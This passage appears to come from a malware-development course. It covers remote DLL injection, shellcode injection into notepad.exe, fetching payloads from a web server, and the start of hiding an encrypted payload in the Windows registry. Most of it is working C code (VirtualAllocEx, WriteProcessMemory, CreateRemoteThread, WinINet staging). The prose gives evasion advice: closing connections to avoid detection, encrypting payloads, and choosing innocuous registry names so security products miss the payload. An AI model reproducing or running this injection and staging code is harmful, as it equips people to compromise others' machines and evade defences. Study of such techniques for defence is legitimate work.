`LoadLibraryW`??is used to load a DLL inside the process that calls it. Since the goal is to load the DLL inside a remote process rather than the local process, then it cannot be invoked directly. Instead, the address of??`LoadLibraryW`??must be retrieved and passed to a remotely created thread in the process, passing the DLL name as its argument. This works because the address of the??`LoadLibraryW`??WinAPI will be the same in the remote process as in the local process. To determine the address of the WinAPI,??`GetProcAddress`??along with??`GetModuleHandle`??is used.

```c
// LoadLibrary is exported by kernel32.dll
// Therefore a handle to kernel32.dll is retrieved followed by the address of LoadLibraryW
pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
```

The address stored in??`pLoadLibraryW`??will be used as the thread entry when a new thread is created in the remote process.

#### Allocating Memory

The next step is to allocate memory in the remote process that can fit the DLL's name,??`DllName`. The??`VirtualAllocEx`??function is used to allocate the memory in the remote process.

```c
// Allocate memory the size of dwSizeToWrite (that is the size of the dll name) inside the remote process, hProcess.
// Memory protection is Read-Write
pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

#### Writing To Allocated Memory

After the memory is successfully allocated in the remote process, it's possible to use??`WriteProcessMemory`??to write to the allocated buffer. The DLL's name is written to the previously allocated memory buffer.

The??`WriteProcessMemory`??WinAPI function looks like the following based on its documentation

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,               // A handle to the process whose memory to be written to
  [in]  LPVOID  lpBaseAddress,          // Base address in the specified process to which data is written
  [in]  LPCVOID lpBuffer,               // A pointer to the buffer that contains data to be written to 'lpBaseAddress'
  [in]  SIZE_T  nSize,                  // The number of bytes to be written to the specified process.	
  [out] SIZE_T  *lpNumberOfBytesWritten // A pointer to a 'SIZE_T' variable that receives the number of bytes actually written
);
```

Based on??`WriteProcessMemory`'s parameters shown above, it will be called as the following, writing the buffer (`DllName`) to the allocated address (`pAddress`), returned by the previously called??`VirtualAllocEx`??function.

```c
// The data being written is the DLL name, 'DllName', which is of size 'dwSizeToWrite'
SIZE_T lpNumberOfBytesWritten = NULL;
WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)
```

#### Execution Via New Thread

After successfully writing the DLL's path to the allocated buffer,??[CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)??will be used to create a new thread in the remote process. This is where the address of??`LoadLibraryW`??becomes necessary.??`pLoadLibraryW`??is passed as the starting address of the thread and then??`pAddress`, which contains the DLL's name, is passed as an argument to the??`LoadLibraryW`??call. This is done by passing??`pAddress`??as the??`lpParameter`??parameter of??`CreateRemoteThread`.

`CreateRemoteThread`'s parameters are the same as that of the??`CreateThread`??WinAPI function explained earlier, except for the additional??`HANDLE hProcess`??parameter, which represents a handle to the process in which the thread is to be created.

```c
// The thread entry will be 'pLoadLibraryW' which is the address of LoadLibraryW
// The DLL's name, pAddress, is passed as an argument to LoadLibrary
HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
```

#### DLL Injection - Code Snippet

```c
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL		bSTATE                    = TRUE;
	
	LPVOID		pLoadLibraryW             = NULL;
	LPVOID		pAddress                  = NULL;
	
	// fetching the size of DllName *in bytes* 
	DWORD		dwSizeToWrite             = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T		lpNumberOfBytesWritten    = NULL;

	HANDLE		hThread                   = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL){
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite){
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] DONE !\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}
```

### Debugging

In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.

First, run??`RemoteDllInjection.exe`??and pass two arguments, the target process and the full DLL path to inject inside the target process. In this demo,??`notepad.exe`??is being injected.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-1.png)

  

The process enumeration successfully worked. Verify that Notepad's PID is indeed??`20932`??using Process Hacker.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-2.png)

  

Next, xdbg is attached to the targeted process, Notepad, and check the allocated address. The image below shows that the buffer was successfully allocated.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-3.png)

  

After the memory allocation, the DLL name is written to the buffer.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-4.png)

  

Finally, a new thread is created in the remote process which executes the DLL.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-5.png)

  

Verify that the DLL was successfully injected using Process Hacker's modules tab.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-6.png)

  

Head to the threads tab in Process Hacker and notice the thread that is running LoadLibraryW as its entry function

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-7.png)
# 3.7 Process Injection - Shellcode Injection

### Introduction

This module will be similar to the previous DLL Injection module with minor changes. Shellcode process injection will use almost the same Windows APIs to perform the task:

- [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)??- Memory allocation.
    
- [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)??- Write the payload to the remote process.
    
- [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)??- Modifying memory protection.
    
- [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)??- Payload execution via a new thread.
    

### Enumerating Processes

Similarly to the previous module, process injection starts by enumerating the processes. The process enumeration code snippet shown below was already explained in the previous module.

```c
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));

	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
	}
```

### Shellcode Injection

To perform shellcode injection the??`InjectShellcodeToRemoteProcess`??function will be used. The function takes 3 parameters:

1. `hProcess`??- A handle to the opened remote process.
    
2. `pShellcode`??- The deobfuscated shellcode's base address and size. The shellcode must be in plaintext before being injected because it cannot be edited once it's in the remote process.
    
3. `sSizeOfShellcode`??- The size of the shellcode.
    

#### Shellcode Injection - Code Snippet

```c
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID	pShellcodeAddress              = NULL;

	SIZE_T	sNumberOfBytesWritten          = NULL;
	DWORD	dwOldProtection                = NULL;


	// Allocate memory in the remote process of size sSizeOfShellcode 
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	memset(pShellcode, '\0', sSizeOfShellcode);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	
	printf("[#] Press <Enter> To Run ... ");
	getchar();
	printf("[i] Executing Payload ... ");
	// Launch the shellcode in a new thread
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE !\n");

	return TRUE;
}
```

### Deallocating Remote Memory

[VirtualFreeEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex)??is a WinAPI that is used to deallocate previously allocated memory in a remote process. This function should only be called after the payload has fully finished execution otherwise it might free the payload's content and crash the process.

```c
BOOL VirtualFreeEx(
  [in] HANDLE hProcess,
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);
```

`VirtualFreeEx`??takes the same parameter as the??`VirtualFree`??WinAPI with the only difference being that??`VirtualFreeEx`??takes an additional parameter (`hProcess`) that specifies the target process where the memory region resides.

### Debugging

In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.

This walkthrough injects shellcode into a Notepad process therefore start by opening up Notepad and attaching the x64 xdbg debugger to it. The image below shows the process has PID??`22992`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-1.png)

  

Run??`RemoteShellcodeInjection.exe`??providing notepad.exe as an argument. The binary will start by searching for the PID of Notepad which should be the same PID shown in the xdbg debugger, which in this case is??`22992`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-2.png)

  

Next, the binary will decrypt the payload. Notice that attempting to access the memory address will result in an error. The reason this happens is because the debugger is attached to the??`notepad.exe`??process whereas the deobfuscation process occurs in the local process which is??`RemoteShellcodeInjection.exe`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-3.png)

  

To view the deobfuscated payload, a new instance of xdbg must be opened and attached to the??`RemoteShellcodeInjection.exe`??process.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-4.png)

  

Back to the Notepad debugger instance, the next step is memory allocation. The base address where the payload will be written is??`0x0000021700230000`. The debugger shows that the allocated memory region was zeroed out.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-5.png)

  

The deobfuscated payload is then written to the allocated memory region in the remote process.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-6.png)

  

Analyzing the local process, the payload was successfully zeroed out since it is not required anymore.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-7.png)

  

Finally, the payload is executed in the remote process inside of a new thread.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-8.png)
# 3.8 Payload Staging - Web Server

### Introduction

Throughout the modules thus far, the payload has been consistently stored directly within the binary. This is a fast and commonly used method to fetch the payload. Unfortunately, in some cases where payload size constraints exist, saving the payload inside the code is not a feasible approach. The alternative approach is to host the payload on a web server and fetch it during execution.

### Setting Up The Web Server

This module requires a web server to host the payload file. The easiest way is to use??[Python's HTTP server](https://docs.python.org/3/library/http.server.html)??using the following command:

`python -m http.server 8000`

Note that the payload file should be hosted in the same directory where this command is executed.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/python-http-server.png)

  

To verify the web server is working, head to??[http://127.0.0.1:8000](http://127.0.0.1:8000/)??using the browser.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/python-http-server-2.png)

### Fetching The Payload

To fetch the payload from the web server, the following Windows APIs will be used:

- [InternetOpenW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw)??- Opens an internet session handle which is a prerequisite to using the other Internet Windows APIs
    
- [InternetOpenUrlW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw)??- Open a handle to the specified resource which is the payload's URL.
    
- [InternetReadFile](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)??- Reads data from the web resource handle. This is the handle opened by??`InternetOpenUrlW`.
    
- [InternetCloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle)??- Closes the handle.
    
- [InternetSetOptionW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw)??- Sets an Internet option.
    

### Opening An Internet Session

The first step is to open an internet session handle using??[InternetOpenW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw)??which initializes an application's use of the WinINet functions. All the parameters being passed to the WinAPI are??`NULL`??since they are mainly for proxy-related matters. It is worth noting that having the second parameter set to??`NULL`??is equivalent to using??`INTERNET_OPEN_TYPE_PRECONFIG`, which specifies that the system's current configuration should be used to determine the proxy settings for the Internet connection.

```c
HINTERNET InternetOpenW(
  [in] LPCWSTR lpszAgent,       // NULL
  [in] DWORD   dwAccessType,    // NULL or INTERNET_OPEN_TYPE_PRECONFIG
  [in] LPCWSTR lpszProxy,       // NULL
  [in] LPCWSTR lpszProxyBypass, // NULL
  [in] DWORD   dwFlags          // NULL
);
```

Calling the function is shown in the snippet below.

```c
// Opening an internet session handle
hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
```

### Opening a Handle To Payload

Moving on to the next WinAPI used,??[InternetOpenUrlW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw), where a connection is being established to the payloads's URL.

```c
HINTERNET InternetOpenUrlW(
  [in] HINTERNET hInternet,       // Handle opened by InternetOpenW
  [in] LPCWSTR   lpszUrl,         // The payload's URL
  [in] LPCWSTR   lpszHeaders,     // NULL
  [in] DWORD     dwHeadersLength, // NULL
  [in] DWORD     dwFlags,         // INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
  [in] DWORD_PTR dwContext        // NULL
);
```

Calling the function is shown in the snippet below. The fifth parameter of the function uses??`INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID`??to achieve a higher success rate with the HTTP request in case of an error on the server side. It's possible to use additional flags such as??`INTERNET_FLAG_IGNORE_CERT_CN_INVALID`??but that will be left up to the reader. The flags are well explained in Microsoft's??[documentation](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw).

```c
// Opening a handle to the payload's URL
hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
```

### Reading Data

[InternetReadFile](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)??is the next WinAPI used which will read the payload.

```c
BOOL InternetReadFile(
  [in]  HINTERNET hFile,                  // Handle opened by InternetOpenUrlW
  [out] LPVOID    lpBuffer,               // Buffer to store the payload
  [in]  DWORD     dwNumberOfBytesToRead,  // The number of bytes to read
  [out] LPDWORD   lpdwNumberOfBytesRead   // Pointer to a variable that receives the number of bytes read
);
```

Before calling the function, a buffer must be allocated to hold the payload. Therefore,??[LocalAlloc](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localalloc)??is used to allocate a buffer the same size as the payload, 272 bytes. Once the buffer has been allocated,??`InternetReadFile`??can be used to read the payload. The function requires the number of bytes to read which in this case is??`272`.

```c
pBytes = (PBYTE)LocalAlloc(LPTR, 272);
InternetReadFile(hInternetFile, pBytes, 272, &dwBytesRead)
```

### Closing InterntHandle

[InternetCloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle)??is used to close an internet handle. This should be called once the payload has been successfully fetched.

```c
BOOL InternetCloseHandle(
  [in] HINTERNET hInternet // Handle opened by InternetOpenW & InternetOpenUrlW
);
```

### Closing HTTP/S Connections

It's important to be aware that the??`InternetCloseHandle`??WinAPI does not close the HTTP/S connection. WinInet tries to reuse connections and therefore although the handle was closed, the connection remains active. Closing the connection is vital to lessen the possibility of detection. For example, a binary was created that fetches a payload from GitHub. The image below shows the binary still connected to GitHub although the binary's execution was completed.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/staging-github.png)

Luckily, the solution is quite simple. All that is required is to tell WinInet to close all the connections using the??[InternetSetOptionW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw)??WinAPI.

```c
BOOL InternetSetOptionW(
  [in] HINTERNET hInternet,     // NULL
  [in] DWORD     dwOption,      // INTERNET_OPTION_SETTINGS_CHANGED
  [in] LPVOID    lpBuffer,      // NULL
  [in] DWORD     dwBufferLength // 0
);
```

Calling??`InternetSetOptionW`??with the??`INTERNET_OPTION_SETTINGS_CHANGED`??flag will cause the system to update the cached version of its internet settings and thus resulting in the connections saved by WinInet being closed.

```c
InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
```

### Payload Staging - Code Snippet

`GetPayloadFromUrl`??is a function that uses the previously discussed steps to fetch the payload from a remote server and stores it in a buffer.

```c
BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;
	
	PBYTE		pBytes                 = NULL;

	DWORD		dwBytesRead            = NULL;

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocating a buffer for the payload
	pBytes = (PBYTE)LocalAlloc(LPTR, 272);

	// Reading the payload
	if (!InternetReadFile(hInternetFile, pBytes, 272, &dwBytesRead)) {
		printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pBytes);

	return TRUE;
}

```

### Dynamic Payload Size Allocation

The above implementation works when the payload size is known. When the size is unknown or is larger than the number of bytes specified in??`InternetReadFile`, a heap overflow will occur resulting in the binary crashing.

One way to solve this issue is by placing??`InternetReadFile`??inside a while loop and continuously reading a constant value of bytes, which for this example will be??`1024`??bytes. The bytes are stored directly in a temporary buffer which will be of the same size,??`1024`. The temporary buffer will be appended to the total bytes buffer which will continuously be reallocated to fit each newly read??`1024`??byte chunk. Once??`InternetReadFile`??reads a value that is less than??`1024`??then that's the indicator that it has reached the end of the file and will break out of the loop.

### Payload Staging With Dynamic Allocation - Code Snippet

```c
BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;
	
	DWORD		dwBytesRead            = NULL;
  
	SIZE_T		sSize                   = NULL; // Used as the total payload size
	
	PBYTE		pBytes                  = NULL; // Used as the total payload heap buffer
	PBYTE		pTmpBytes               = NULL; // Used as the temp buffer of size 1024 bytes

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		return FALSE;
	}

	while (TRUE) {

		// Reading 1024 bytes to the temp buffer
		// InternetReadFile will read less bytes in case the final chunk is less than 1024 bytes
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// Updating the size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			return FALSE;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer 
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}

	// Clean up
	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);

	return TRUE;
}

```

### Payload Staging Final - Code Snippet

The??`GetPayloadFromUrl`??function now takes 3 parameters:

- `szUrl`- The URL of the payload.
    
- `pPayloadBytes`??- Returns as the base address of the buffer containing the payload.
    
- `sPayloadSize`??- The total size of the payload that was read.
    

The function will also correctly closes the HTTP/S connections once the retrieval of the payload has been completed.

```c
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE            = TRUE;

	HINTERNET	hInternet         = NULL,
			    hInternetFile     = NULL;

	DWORD		dwBytesRead       = NULL;
	
	SIZE_T		sSize             = NULL;
	PBYTE		pBytes            = NULL,
			    pTmpBytes          = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL){
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL){
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL){
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE){

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}
		
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024){
			break;
		}
	}
	


	*pPayloadBytes = pBytes;
	*sPayloadSize  = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}
```

#### Implementation Note

In this module, the payload was retrieved from the internet as raw binary data, without any encryption or obfuscation. While this approach may evade basic security measures that analyze the binary code for signs of malicious activity, it'll get flagged by network scanning tools. Therefore, if the payload is not encrypted, packets captured during the transmission may contain identifiable snippets of the payload. This could expose the payload's signature, leading to the implementation process being flagged.

In real-world scenarios, it is always advised to encrypt or obfuscate the payload even if it's fetched at runtime.

### Running The Final Binary

The binary successfully fetches the payload.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/staging-demo-1.png)

The connections are closed once execution is completed.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/staging-demo-2.png)
# 3.9 Payload Staging - Windows Registry

### Introduction

The previous module showed that a payload does not necessarily need to be stored inside the malware. Instead, the payload can be fetched at runtime by the malware. This module will show a similar technique, except the payload will be written as a registry key value and then fetched from the Registry when required. Since the payload will be stored in the Registry, if security solutions scan the malware they will be unable to detect or find any payload within.

This code in this module is divided into two parts. The first part is writing the encrypted payload to a registry key. The second part reads the payload from the same registry key, decrypts it and executes it. The module will not explain the encryption/decryption process as this was explained in prior modules.

This module will also introduce the concept of??[Conditional Compilation](https://www.techonthenet.com/c_language/directives/ifdef.php).

### Conditional Compilation

Conditional compilation is a way to include code inside a project which the compiler will either compile or not compile. This will be used by the implementation to decide whether it's reading or writing to the Registry.

The two sections below provide skeleton code as to how the read and write operations will be written using conditional compilation.

#### Write Operation

```c
	#define WRITEMODE

	// Code that will be compiled in both cases
	
	// if 'WRITEMODE' is defined 
	#ifdef WRITEMODE
		// The code that will be compiled 
		// Code that's needed to write the payload to the Registry
	#endif

	// if 'READMODE' is defined 
	#ifdef READMODE
		// Code that will NOT be compiled
	#endif

```

#### Read Operation

```c
	#define READMODE

	// Code that will be compiled in both cases
	
	// if 'READMODE' is defined 
	#ifdef READMODE
		// The code that will be compiled
		// Code that's needed to read the payload from the Registry
	#endif
	
	// if 'WRITEMODE' is defined 
	#ifdef WRITEMODE
		// Code that will NOT be compiled
	#endif
	
```

### Writing To The Registry

This section will walk through the??`WriteShellcodeToRegistry`??function. The function takes two parameters:

1. `pShellcode`??- The payload to be written.
    
2. `dwShellcodeSize`??- The size of the payload to be written.
    

#### REGISTRY & REGSTRING

The code starts with two pre-defined constants??`REGISTRY`??and??`REGSTRING`??which are set to??`Control Panel`??and??`MalDevAcademy`??respectively.

```c
// Registry key to read / write
#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"
```

`REGISTRY`??is the name of the registry key that will hold the payload. The full path of??`REGISTRY`??will be??`Computer\HKEY_CURRENT_USER\Control Panel`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-img.png)

What the function will be doing programmatically is creating a new??`String Value`??under this registry key to store the payload.??`REGSTRING`??is the name of the string value that will be created. Obviously, in a real situation, use a more realistic value such as??`PanelUpdateService`??or??`AppSnapshot`.

